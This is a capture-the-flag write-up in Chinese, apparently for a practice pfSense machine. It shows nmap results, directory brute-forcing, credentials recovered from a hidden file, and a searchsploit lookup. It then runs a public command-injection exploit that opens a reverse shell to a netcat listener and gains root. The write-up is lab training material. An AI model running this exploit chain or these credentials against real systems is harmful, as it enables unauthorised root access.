## nmap

```Bash
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login

```



## http

80跳转443，是一个登录页面

![](https://secure2.wostatic.cn/static/bEJ6isquyqaegMxg1LKVCe/image.png?auth_key=1677500330-9Pt8sG37ppHAPQ7xbqDneA-0-a475892986268b66f626422562f63175)



目录爆破（已经剔除了前端相关页面，和登录页面重复网页，只保留有效）

```Bash
/index.html           (Status: 200) [Size: 329]
/help.php             (Status: 200) [Size: 6689]
/index.php            (Status: 200) [Size: 6690]
/changelog.txt        (Status: 200) [Size: 271]

```

changelog.txt 的内容提示当前版本有漏洞未修复

### 巨坑

这个题目的核心是下面这个文件，扫描的时候要很困难才会扫出来，这个只使用txt后缀，扫了15分钟，上次加多个后缀用了2个小时。

![](https://secure2.wostatic.cn/static/oWmBQEBVJ6vTiHhyT8HKwZ/image.png?auth_key=1677500330-kU9Uck4vmMqDz3mGWXpmfe-0-accba80fa32f0b9ce76d37c03b1bd0b1)

![](https://secure2.wostatic.cn/static/aXCs6mQ8gWD9hvAbQzh9aX/image.png?auth_key=1677500330-d1nFUwx4qzd5W7TqiKYHuj-0-1d2b0a6c17bc34a4e314c534de47c6fe)

根据提示，拿到用户名密码未 rohit/pfsense

```Bash
└─# searchsploit pfsense | grep 2.1
pfSense 2.1 build 20130911-1816 - Directory Traversal                                                                                                                                                                                                      | php/webapps/31263.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                                                                                             | php/webapps/43560.py

```

根据页面版本提示拿到唯一命中版本的exp，跑脚本拿到root shell

```Bash
└─# python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.11 --lport 7777 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed

└─# nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.60] 55044
sh: can't access tty; job control turned off
#
#

# # iud
iud: not found
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
#


```



